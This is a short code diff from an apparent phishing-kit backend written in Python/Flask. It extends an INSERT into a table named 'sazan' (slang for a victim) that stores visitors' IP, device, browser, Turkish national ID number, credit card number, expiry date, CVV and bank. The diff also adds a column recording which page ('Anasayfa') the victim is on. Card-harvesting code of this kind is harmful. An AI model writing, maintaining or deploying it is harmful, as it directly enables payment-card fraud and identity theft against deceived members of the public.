@@ -85,11 +85,11 @@ def index():
         browser_name = detect_browser(request.headers.get("User-Agent"))
 
         insert_sql = """
-            INSERT INTO sazan (ip, date, cihaz, tarayici, tc, kk, sonkul, cvv, banka)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            INSERT INTO sazan (ip, date, cihaz, tarayici, tc, kk, sonkul, cvv, banka, now)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """
         with get_cursor() as cursor:
-            params = (client_ip, now_str, device_name, browser_name, tc, sanitized_card, expiry, cvv, bank_name)
+            params = (client_ip, now_str, device_name, browser_name, tc, sanitized_card, expiry, cvv, bank_name, "Anasayfa")
             if AppConfig.database_url:
                 cursor.execute(insert_sql + " RETURNING id", params)
                 new_row = cursor.fetchone()
